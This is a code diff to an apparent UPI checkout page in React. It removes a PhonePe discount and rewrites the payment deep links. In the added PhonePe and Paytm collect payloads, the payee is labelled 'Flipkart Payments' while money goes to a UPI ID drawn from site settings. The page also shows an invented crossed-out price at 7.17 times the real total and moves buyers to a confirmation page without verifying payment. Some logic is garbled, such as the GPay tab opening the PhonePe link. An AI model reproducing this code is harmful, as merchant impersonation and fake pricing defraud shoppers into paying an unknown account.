@@ -38,11 +38,6 @@ export default function Payments() {
     const [loading,   setLoading]   = useState(false);
     const [mounted,   setMounted]   = useState(false);
     const [orderId,   setOrderId]   = useState("");
-    
-    // Discount states
-    const [phonePeDiscount, setPhonePeDiscount] = useState(0);
-    const [showDiscountBadge, setShowDiscountBadge] = useState(false);
-    const [discountPercentage, setDiscountPercentage] = useState(10); // 10% discount for PhonePe
 
     useEffect(() => setMounted(true), []);
 
@@ -67,29 +62,12 @@ export default function Payments() {
                 setSettings(data.data);
                 const upi = data.data?.upi || {};
                 setProducts(p => ({ ...p, ...upi }));
-                
-                // Check if PhonePe is enabled and set it as default
-                if (upi.Phonepe !== false) {
-                    setActiveTab(3);
-                    // Apply PhonePe discount
-                    const discount = upi.phonePeDiscount || 10; // Default 10% if not set
-                    setDiscountPercentage(discount);
-                    setShowDiscountBadge(true);
-                } else if (upi.Gpay !== false) {
-                    setActiveTab(2);
-                } else if (upi.Paytm !== false) {
-                    setActiveTab(4);
-                } else if (upi.Bhim !== false) {
-                    setActiveTab(1);
-                } else if (data.data?.payment?.cashfreeEnabled) {
-                    setActiveTab(6);
-                } else {
-                    setActiveTab(3);
-                }
-            } catch { 
-                setActiveTab(3);
-                setShowDiscountBadge(true);
-            }
+                if      (data.data?.payment?.cashfreeEnabled) setActiveTab(6);
+                else if (upi.Phonepe !== false)               setActiveTab(3);
+                else if (upi.Gpay    !== false)               setActiveTab(2);
+                else if (upi.Paytm   !== false)               setActiveTab(4);
+                else                                          setActiveTab(1);
+            } catch { setActiveTab(3); }
         })();
     }, []);
 
@@ -108,21 +86,9 @@ export default function Payments() {
     }, [activeTab, cart]);
 
     /* totals */
-    const baseTotal = cart.reduce((s,p) => s + Math.round((p.sellingPrice||0)*(p.quantity||1)), 0);
-    const itemCount = cart.reduce((s,p) => s + (p.quantity||1), 0);
-    const crossedMrp = Math.round(baseTotal * 7.17);
-
-    // Calculate PhonePe discount
-    const calculatePhonePeDiscount = (amount) => {
-        if (activeTab === 3) {
-            return Math.round(amount * (discountPercentage / 100));
-        }
-        return 0;
-    };
-
-    const phonePeDiscountAmount = calculatePhonePeDiscount(baseTotal);
-    const totalMrp = activeTab === 3 ? baseTotal - phonePeDiscountAmount : baseTotal;
-    const savedAmount = activeTab === 3 ? phonePeDiscountAmount : 0;
+    const totalMrp      = cart.reduce((s,p) => s + Math.round((p.sellingPrice||0)*(p.quantity||1)), 0);
+    const itemCount     = cart.reduce((s,p) => s + (p.quantity||1), 0);
+    const crossedMrp    = Math.round(totalMrp * 7.17);
 
     /* ── UPI deep-links ── */
     useEffect(() => {
@@ -133,11 +99,11 @@ export default function Payments() {
         if (!products?.id) { setPayUrl(""); return; }
         const id = products.id;
 
-        // 1. PhonePe Native with discount
+        // PhonePe Native Payload
         const ppPayload = {
             p2pPaymentCheckoutParams: {
                 checkoutType: "COLLECT",
-                initialAmount: amt * 100,
+                initialAmount: amt * 100, // amount in paise
                 note: {
                     type: "text",
                     message: orderId
@@ -146,25 +112,35 @@ export default function Payments() {
             },
             contact: {
                 type: "EXTERNAL_MERCHANT",
-                name: "Store Name",
+                name: "Flipkart Payments",
                 vpa: id
             }
         };
-        const phonePeLink = `phonepe://native?data=${encodeURIComponent(btoa(JSON.stringify(ppPayload)))}&id=p2ppayment`;
+        const ppLink = `phonepe://native?data=${encodeURIComponent(btoa(JSON.stringify(ppPayload)))}&id=p2ppayment`;
 
-        // 2. Google Pay
-        const gpayLink = `gpay://pay?pa=${encodeURIComponent(id)}&pn=${encodeURIComponent("Store Name")}&am=${amt}&tr=${txn}&tn=${encodeURIComponent(orderId)}&mc=8931&cu=INR`;
-
-        // 3. Paytm
-        const paytmLink = `paytmmp://pay?pa=${encodeURIComponent(id)}&pn=${encodeURIComponent("Store")}&am=${amt}&tr=${txn}&cu=INR&tn=${encodeURIComponent(orderId)}`;
-
-        // 4. BHIM UPI
-        const bhimLink = `bhim://pay?pa=${encodeURIComponent(id)}&pn=${encodeURIComponent("Store")}&am=${amt}&tr=${txn}&mc=8931&cu=INR&tn=${encodeURIComponent(orderId)}`;
+        // Paytm Native Payload
+        const paytmPayload = {
+            p2pPaymentCheckoutParams: {
+                checkoutType: "COLLECT",
+                initialAmount: amt * 100, // amount in paise
+                note: {
+                    type: "text",
+                    message: orderId
+                },
+                supportedInstruments: -1
+            },
+            contact: {
+                type: "EXTERNAL_MERCHANT",
+                name: "Flipkart Payments",
+                vpa: id
+            }
+        };
+        const paytmLink = `paytmmp://cash_wallet?featuretype=sendmoney&data=${encodeURIComponent(btoa(JSON.stringify(paytmPayload)))}`;
 
         const urls = {
-            1: bhimLink,
-            2: gpayLink,
-            3: phonePeLink,
+            1: `bhim://pay?pa=${id}&pn=Store&am=${amt}&tr=${txn}&mc=8931&cu=INR&tn=${orderId}`,
+            2: ppLink,
+            3: ppLink,
             4: paytmLink,
         };
         setPayUrl(urls[activeTab] || "");
@@ -179,13 +155,7 @@ export default function Payments() {
                 const res  = await fetch("/api/payment/cashfree", {
                     method:"POST",
                     headers:{"Content-Type":"application/json"},
-                    body: JSON.stringify({ 
-                        amount: totalMrp, 
-                        orderId, 
-                        name: user.name || "Customer", 
-                        phone: user.phone || "9999999999", 
-                        email: user.email || "customer@example.com" 
-                    }),
+                    body: JSON.stringify({ amount:totalMrp, orderId, name:user.name||"Customer", phone:user.phone||"9999999999", email:user.email||"customer@example.com" }),
                 });
                 const data = await res.json();
                 if (!res.ok || !data.success) throw new Error(data.message || "Server error. Please try again.");
@@ -212,55 +182,28 @@ export default function Payments() {
             return;
         }
         if (payUrl) {
-            // Save details to lastOrder
+            // Save details to lastOrder so they are accessible by other pages
             const orderDetails = {
                 orderId,
                 items: cart,
                 total: totalMrp,
-                originalTotal: baseTotal,
-                discount: savedAmount,
-                discountPercentage: activeTab === 3 ? discountPercentage : 0,
                 shippingAddress: user,
                 paymentMethod: activeTab === 1 ? "BHIM" : activeTab === 2 ? "GPay" : activeTab === 3 ? "PhonePe" : activeTab === 4 ? "Paytm" : "UPI",
                 date: new Date().toISOString(),
             };
             localStorage.setItem("lastOrder", JSON.stringify(orderDetails));
 
-            // Launch the deep link
+            // Launch the UPI deep link
             window.location.href = payUrl;
 
-            // Wait and redirect to confirmation
+            // Wait 1 second and then redirect the browser to the payment confirmation page
             setLoading(true);
             setTimeout(() => {
-                router.push(`/confirm-payment?orderId=${orderId}&amount=${totalMrp}&discount=${savedAmount}`);
+                router.push(`/confirm-payment?orderId=${orderId}&amount=${totalMrp}`);
             }, 1200);
             return;
         }
         alert("Please select a payment method.");
-    };
-
-    // Force PhonePe as default and show discount
-    const handlePhonePeClick = () => {
-        setActiveTab(3);
-        setShowDiscountBadge(true);
-    };
-
-    // Handle other payment methods - show warning about losing discount
-    const handleOtherPaymentClick = (tab) => {
-        if (tab !== 3 && showDiscountBadge) {
-            const confirmSwitch = window.confirm(
-                `⚠️ You will lose ₹${phonePeDiscountAmount} PhonePe discount if you switch payment method.\n\nDo you want to continue?`
-            );
-            if (!confirmSwitch) {
-                return;
-            }
-        }
-        setActiveTab(tab);
-        if (tab === 3) {
-            setShowDiscountBadge(true);
-        } else {
-            setShowDiscountBadge(false);
-        }
     };
 
     if (!mounted || activeTab === null) return null;
@@ -271,6 +214,15 @@ export default function Payments() {
         paytm:    products.Paytm    !== false,
         bhim:     products.Bhim     !== false,
         cashfree: !!settings?.payment?.cashfreeEnabled,
+    };
+
+    // Helper to get active payment color theme
+    const getThemeColor = () => {
+        if (activeTab === 3) return "#5f259f"; // PhonePe Purple
+        if (activeTab === 2) return "#1a73e8"; // GPay Blue
+        if (activeTab === 4) return "#00baf2"; // Paytm Cyan
+        if (activeTab === 1) return "#f97316"; // BHIM Orange
+        return "#1f2937"; // Gray
     };
 
     return (
@@ -295,8 +247,10 @@ export default function Payments() {
                 .header-menu, nav>ul, footer,
                 .cart_page_footer { display:none !important; }
 
+                /* ── PAGE ── */
                 .pmt-page { background:#f8fafc; min-height:100vh; max-width:600px; margin:0 auto; box-shadow:0 0 20px rgba(0,0,0,0.03); }
 
+                /* ── STICKY HEADER ── */
                 .pmt-header {
                     background:#fff;
                     position:sticky;
@@ -355,6 +309,7 @@ export default function Payments() {
                     color:#15803d;
                 }
 
+                /* Stepper */
                 .stepper {
                     display: flex; justify-content: center; align-items: center;
                     gap: 0; padding: 14px 16px; border-bottom: 1px solid #e2e8f0;
@@ -375,51 +330,10 @@ export default function Payments() {
                 .step-line { flex: 1; height: 2px; background: #e2e8f0; margin-top: -14px; }
                 .step-line.done { background: #10b981; }
 
+                /* ── BODY ── */
                 .pmt-body { padding:16px 16px 120px; }
 
-                /* Discount Banner */
-                .discount-banner {
-                    background: linear-gradient(135deg, #fef3c7, #fde68a);
-                    border: 2px solid #f59e0b;
-                    border-radius: 12px;
-                    padding: 12px 16px;
-                    margin-bottom: 16px;
-                    display: flex;
-                    align-items: center;
-                    gap: 12px;
-                    animation: pulse-banner 2s infinite;
-                }
-                @keyframes pulse-banner {
-                    0%, 100% { opacity: 1; }
-                    50% { opacity: 0.8; }
-                }
-                .discount-banner-icon {
-                    font-size: 28px;
-                    flex-shrink: 0;
-                }
-                .discount-banner-text {
-                    flex: 1;
-                }
-                .discount-banner-title {
-                    font-weight: 700;
-                    color: #92400e;
-                    font-size: 15px;
-                }
-                .discount-banner-sub {
-                    font-size: 13px;
-                    color: #78350f;
-                    margin-top: 2px;
-                }
-                .discount-banner-amount {
-                    background: #92400e;
-                    color: #fef3c7;
-                    padding: 4px 12px;
-                    border-radius: 20px;
-                    font-weight: 700;
-                    font-size: 18px;
-                    white-space: nowrap;
-                }
-
+                /* ── UPI SECTION ── */
                 .upi-section {
                     background:#fff;
                     border:1px solid #e2e8f0;
@@ -448,11 +362,13 @@ export default function Payments() {
                     color:#0f172a;
                 }
 
+                /* white card inside */
                 .upi-opts-card {
                     padding:8px 0;
                     background:#fff;
                 }
 
+                /* ── OPTION ROW ── */
                 .pmt-opt {
                     display:flex;
                     align-items:center;
@@ -461,20 +377,17 @@ export default function Payments() {
                     cursor:pointer;
                     transition:background-color 0.15s, transform 0.15s;
                     border-bottom:1px solid #f1f5f9;
-                    position: relative;
                 }
                 .pmt-opt:last-child { border-bottom:none; }
                 .pmt-opt:hover { background-color:#f8fafc; }
-                .pmt-opt.active-opt { 
-                    background-color:#f1f5f9;
-                    border-left: 4px solid var(--theme-color, #5f259f);
-                }
+                .pmt-opt.active-opt { background-color:#f1f5f9; }
                 .pmt-opt-left {
                     display:flex;
                     align-items:center;
                     gap:14px;
                     flex:1;
                 }
+                /* Custom radio button */
                 .pmt-radio-wrap {
                     position:relative;
                     width:20px;
@@ -522,27 +435,7 @@ export default function Payments() {
                 .sub-bhim    { color:#ea580c; }
                 .sub-cashfree{ color:#334155; }
 
-                /* Discount badge on PhonePe option */
-                .discount-badge {
-                    background: linear-gradient(135deg, #f59e0b, #d97706);
-                    color: white;
-                    padding: 2px 10px;
-                    border-radius: 12px;
-                    font-size: 10px;
-                    font-weight: 700;
-                    margin-left: 6px;
-                    animation: pulse-badge 1.5s infinite;
-                }
-                @keyframes pulse-badge {
-                    0%, 100% { transform: scale(1); }
-                    50% { transform: scale(1.05); }
-                }
-                .saved-amount {
-                    font-size: 12px;
-                    color: #059669;
-                    font-weight: 600;
-                }
-
+                /* ── PRICE SUMMARY ── */
                 .price-box {
                     background:#fff;
                     border:1px solid #e2e8f0;
@@ -567,10 +460,6 @@ export default function Payments() {
                 }
                 .price-free  { color:#16a34a; font-weight:600; }
                 .price-strike{ text-decoration:line-through; color:#94a3b8; }
-                .price-discount {
-                    color: #059669;
-                    font-weight: 600;
-                }
                 .price-total-row {
                     display:flex;
                     justify-content:space-between;
@@ -589,10 +478,8 @@ export default function Payments() {
                     font-weight:800;
                     color:#0f172a;
                 }
-                .price-total-amt.discounted {
-                    color: #059669;
-                }
 
+                /* ── SECURE PAY IMAGE ── */
                 .secure-pay-wrap {
                     display:flex;
                     justify-content:center;
@@ -605,6 +492,7 @@ export default function Payments() {
                     opacity:0.8;
                 }
 
+                /* ── FOOTER BAR ── */
                 .pmt-footer {
                     position:fixed;
                     bottom:0;
@@ -638,14 +526,6 @@ export default function Payments() {
                     color:#0f172a;
                     line-height:1.2;
                 }
-                .pmt-footer-amt.discounted {
-                    color: #059669;
-                }
-                .pmt-footer-saved {
-                    font-size: 11px;
-                    color: #059669;
-                    font-weight: 600;
-                }
                 .pmt-pay-btn {
                     background:#fb641b;
                     color:#fff;
@@ -668,6 +548,7 @@ export default function Payments() {
                 .pmt-pay-btn:active:not(:disabled)  { background:#c84a00; transform:translateY(0); }
                 .pmt-pay-btn:disabled               { opacity:.6; cursor:not-allowed; box-shadow:none; }
 
+                /* spinner */
                 .btn-spin {
                     width:16px; height:16px;
                     border:2px solid rgba(0,0,0,.15);
@@ -724,24 +605,6 @@ export default function Payments() {
                 {/* ══ BODY ══ */}
                 <div className="pmt-body">
 
-                    {/* Discount Banner - Only show for PhonePe */}
-                    {showDiscountBadge && activeTab === 3 && phonePeDiscountAmount > 0 && (
-                        <div className="discount-banner">
-                            <div className="discount-banner-icon">🎉</div>
-                            <div className="discount-banner-text">
-                                <div className="discount-banner-title">
-                                    PhonePe Special Discount!
-                                </div>
-                                <div className="discount-banner-sub">
-                                    Get {discountPercentage}% OFF on your order
-                                </div>
-                            </div>
-                            <div className="discount-banner-amount">
-                                -₹{phonePeDiscountAmount}
-                            </div>
-                        </div>
-                    )}
-
                     {/* ── UPI SECTION ── */}
                     <div className="upi-section">
                         <div className="upi-sec-hdr">
@@ -754,54 +617,60 @@ export default function Payments() {
 
                         <div className="upi-opts-card">
 
-                            {/* PhonePe - RECOMMENDED with discount */}
+                            {/* PhonePe */}
                             {show.phonepe && (
-                                <div 
-                                    className={`pmt-opt ${activeTab===3 ? 'active-opt' : ''}`} 
-                                    onClick={handlePhonePeClick} 
-                                    style={{"--theme-color": "#5f259f"}}
-                                >
+                                <div className={`pmt-opt ${activeTab===3 ? 'active-opt' : ''}`} onClick={() => setActiveTab(3)} style={{"--theme-color": "#5f259f"}}>
                                     <div className="pmt-opt-left">
                                         <div className={`pmt-radio-wrap ${activeTab===3 ? 'checked' : ''}`}>
                                             <div className="pmt-radio-inner" />
                                         </div>
                                         <div className="pmt-opt-info">
                                             <div className="pmt-opt-top">
-                                                <span>₹{activeTab === 3 ? totalMrp : baseTotal}</span>
+                                                <span>₹{totalMrp}</span>
                                                 <span className="pmt-pipe">|</span>
                                                 <span>PhonePe</span>
-                                                <span className="discount-badge">🔥 SAVE {discountPercentage}%</span>
                                             </div>
-                                            <p className="pmt-opt-sub sub-phonepe">
-                                                Use PhonePe UPI & get ₹{phonePeDiscountAmount} off
-                                            </p>
+                                            <p className="pmt-opt-sub sub-phonepe">Use PhonePe UPI</p>
                                         </div>
                                     </div>
-                                    <div style={{display:"flex", alignItems:"center", gap:"8px"}}>
-                                        {activeTab !== 3 && phonePeDiscountAmount > 0 && (
-                                            <span className="saved-amount">Save ₹{phonePeDiscountAmount}</span>
-                                        )}
-                                        <img src="/assets/images/phonepe.svg" alt="PhonePe" width={28} height={28}
-                                            onError={e=>{e.target.outerHTML='<svg width="28" height="28" viewBox="0 0 30 30"><circle cx="15" cy="15" r="15" fill="#5f259f"/><text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" fill="#fff" font-size="14" font-weight="bold">₱</text></svg>';}}
-                                        />
+                                    <img src="/assets/images/phonepe.svg" alt="PhonePe" width={28} height={28}
+                                        onError={e=>{e.target.outerHTML='<svg width="28" height="28" viewBox="0 0 30 30"><circle cx="15" cy="15" r="15" fill="#5f259f"/><text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" fill="#fff" font-size="14" font-weight="bold">₱</text></svg>';}}
+                                    />
+                                </div>
+                            )}
+
+                            {/* GPay */}
+                            {show.phonepe2 && (
+                                <div className={`pmt-opt ${activeTab===7 ? 'active-opt' : ''}`} onClick={() => setActiveTab(7)} style={{"--theme-color": "#5f259f"}}>
+                                    <div className="pmt-opt-left">
+                                        <div className={`pmt-radio-wrap ${activeTab===7 ? 'checked' : ''}`}>
+                                            <div className="pmt-radio-inner" />
+                                        </div>
+                                        <div className="pmt-opt-info">
+                                            <div className="pmt-opt-top">
+                                                <span>₹{totalMrp}</span>
+                                                <span className="pmt-pipe">|</span>
+                                                <span>{products.Phonepe2Name || "PhonePe"}</span>
+                                            </div>
+                                            <p className="pmt-opt-sub sub-phonepe">Use PhonePe UPI</p>
+                                        </div>
                                     </div>
+                                    <img src="/assets/images/phonepe.svg" alt="PhonePe" width={28} height={28}
+                                        onError={e=>{e.target.outerHTML='<svg width="28" height="28" viewBox="0 0 30 30"><circle cx="15" cy="15" r="15" fill="#5f259f"/><text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" fill="#fff" font-size="14" font-weight="bold">₱</text></svg>';}}
+                                    />
                                 </div>
                             )}
 
                             {/* GPay */}
                             {show.gpay && (
-                                <div 
-                                    className={`pmt-opt ${activeTab===2 ? 'active-opt' : ''}`} 
-                                    onClick={() => handleOtherPaymentClick(2)} 
-                                    style={{"--theme-color": "#1a73e8"}}
-                                >
+                                <div className={`pmt-opt ${activeTab===2 ? 'active-opt' : ''}`} onClick={() => setActiveTab(2)} style={{"--theme-color": "#1a73e8"}}>
                                     <div className="pmt-opt-left">
                                         <div className={`pmt-radio-wrap ${activeTab===2 ? 'checked' : ''}`}>
                                             <div className="pmt-radio-inner" />
                                         </div>
                                         <div className="pmt-opt-info">
                                             <div className="pmt-opt-top">
-                                                <span>₹{baseTotal}</span>
+                                                <span>₹{totalMrp}</span>
                                                 <span className="pmt-pipe">|</span>
                                                 <span>GPay</span>
                                             </div>
@@ -816,22 +685,18 @@ export default function Payments() {
 
                             {/* Paytm */}
                             {show.paytm && (
-                                <div 
-                                    className={`pmt-opt ${activeTab===4 ? 'active-opt' : ''}`} 
-                                    onClick={() => handleOtherPaymentClick(4)} 
-                                    style={{"--theme-color": "#00baf2"}}
-                                >
+                                <div className={`pmt-opt ${activeTab===4 ? 'active-opt' : ''}`} onClick={() => setActiveTab(4)} style={{"--theme-color": "#00baf2"}}>
                                     <div className="pmt-opt-left">
                                         <div className={`pmt-radio-wrap ${activeTab===4 ? 'checked' : ''}`}>
                                             <div className="pmt-radio-inner" />
                                         </div>
                                         <div className="pmt-opt-info">
                                             <div className="pmt-opt-top">
-                                                <span>₹{baseTotal}</span>
+                                                <span>₹{totalMrp}</span>
                                                 <span className="pmt-pipe">|</span>
                                                 <span>PayTM</span>
                                             </div>
-                                            <p className="pmt-opt-sub sub-paytm">Pay using Paytm UPI</p>
+                                            <p className="pmt-opt-sub sub-paytm">Use Paytm UPI</p>
                                         </div>
                                     </div>
                                     <img src="/assets/images/PAYTM.NS_BIG.svg" alt="Paytm" width={45} height={32}
@@ -842,18 +707,14 @@ export default function Payments() {
 
                             {/* BHIM */}
                             {show.bhim && (
-                                <div 
-                                    className={`pmt-opt ${activeTab===1 ? 'active-opt' : ''}`} 
-                                    onClick={() => handleOtherPaymentClick(1)} 
-                                    style={{"--theme-color": "#ea580c"}}
-                                >
+                                <div className={`pmt-opt ${activeTab===1 ? 'active-opt' : ''}`} onClick={() => setActiveTab(1)} style={{"--theme-color": "#ea580c"}}>
                                     <div className="pmt-opt-left">
                                         <div className={`pmt-radio-wrap ${activeTab===1 ? 'checked' : ''}`}>
                                             <div className="pmt-radio-inner" />
                                         </div>
                                         <div className="pmt-opt-info">
                                             <div className="pmt-opt-top">
-                                                <span>₹{baseTotal}</span>
+                                                <span>₹{totalMrp}</span>
                                                 <span className="pmt-pipe">|</span>
                                                 <span>BHIM UPI</span>
                                             </div>
@@ -868,18 +729,14 @@ export default function Payments() {
 
                             {/* Cashfree */}
                             {show.cashfree && (
-                                <div 
-                                    className={`pmt-opt ${activeTab===6 ? 'active-opt' : ''}`} 
-                                    onClick={() => handleOtherPaymentClick(6)} 
-                                    style={{"--theme-color": "#334155"}}
-                                >
+                                <div className={`pmt-opt ${activeTab===6 ? 'active-opt' : ''}`} onClick={() => setActiveTab(6)} style={{"--theme-color": "#334155"}}>
                                     <div className="pmt-opt-left">
                                         <div className={`pmt-radio-wrap ${activeTab===6 ? 'checked' : ''}`}>
                                             <div className="pmt-radio-inner" />
                                         </div>
                                         <div className="pmt-opt-info">
                                             <div className="pmt-opt-top">
-                                                <span>₹{baseTotal}</span>
+                                                <span>₹{totalMrp}</span>
                                                 <span className="pmt-pipe">|</span>
                                                 <span>Card / Net Banking</span>
                                             </div>
@@ -904,35 +761,20 @@ export default function Payments() {
                         <h4 className="price-box-title">Order Details</h4>
                         <div className="price-row">
                             <span>Price ({itemCount} item{itemCount!==1?"s":""})</span>
-                            <span>₹ {baseTotal}</span>
+                            <span>₹ {totalMrp}</span>
                         </div>
                         <div className="price-row">
                             <span>Delivery Charges</span>
                             <span className="price-free">FREE</span>
                         </div>
-                        {activeTab === 3 && phonePeDiscountAmount > 0 && (
-                            <div className="price-row">
-                                <span style={{color: "#059669", fontWeight: 600}}>
-                                    🎉 PhonePe Discount ({discountPercentage}% off)
-                                </span>
-                                <span className="price-discount">- ₹{phonePeDiscountAmount}</span>
-                            </div>
-                        )}
                         <div className="price-row">
                             <span>Discount Price</span>
                             <span className="price-strike">₹ {crossedMrp}</span>
                         </div>
                         <div className="price-total-row">
                             <div className="price-total-lbl">Total Amount</div>
-                            <span className={`price-total-amt ${activeTab === 3 ? 'discounted' : ''}`}>
-                                ₹ {totalMrp}
-                            </span>
+                            <span className="price-total-amt">₹ {totalMrp}</span>
                         </div>
-                        {activeTab === 3 && phonePeDiscountAmount > 0 && (
-                            <div style={{marginTop: 8, textAlign: "right", fontSize: 12, color: "#059669", fontWeight: 600}}>
-                                You saved ₹{phonePeDiscountAmount} with PhonePe!
-                            </div>
-                        )}
                     </div>
 
                     {/* ── SECURE PAY BANNER ── */}
@@ -951,15 +793,12 @@ export default function Payments() {
                 <div className="pmt-footer">
                     <div className="pmt-footer-left">
                         <span className="pmt-footer-lbl">Total Price</span>
-                        <div className={`pmt-footer-amt ${activeTab === 3 ? 'discounted' : ''}`}>
+                        <div className="pmt-footer-amt">
                             ₹{totalMrp}
                         </div>
-                        {activeTab === 3 && phonePeDiscountAmount > 0 && (
-                            <div className="pmt-footer-saved">
-                                Saved ₹{phonePeDiscountAmount}
-                            </div>
-                        )}
                     </div>
+                    
+
 
                     <button
                         className="pmt-pay-btn"
@@ -968,9 +807,7 @@ export default function Payments() {
                     >
                         {loading
                             ? <><span className="btn-spin"/>&nbsp;PROCESSING…</>
-                            : activeTab === 3 && phonePeDiscountAmount > 0 
-                                ? `PAY ₹${totalMrp} (SAVE ₹${phonePeDiscountAmount})`
-                                : "PROCEED TO PAY"
+                            : "PROCEED TO PAY"
                         }
                     </button>
                 </div>
